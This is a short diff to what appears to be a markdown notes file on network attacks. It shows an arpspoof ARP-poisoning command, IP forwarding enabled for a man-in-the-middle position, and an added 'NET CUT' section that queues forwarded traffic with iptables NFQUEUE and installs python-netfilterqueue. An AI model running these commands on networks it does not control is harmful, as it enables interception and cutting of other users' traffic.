@@ -18,3 +18,10 @@ arpspoof -i eth0 -t 10.0.2.1 10.0.2.7
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
+## NET CUT
+```
+sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
+pip3 install -U git+https://github.com/kti/python-netfilterqueue
+sudo pip3 install -U git+https://github.com/kti/python-netfilterqueue
+sudo iptables --flush
+```
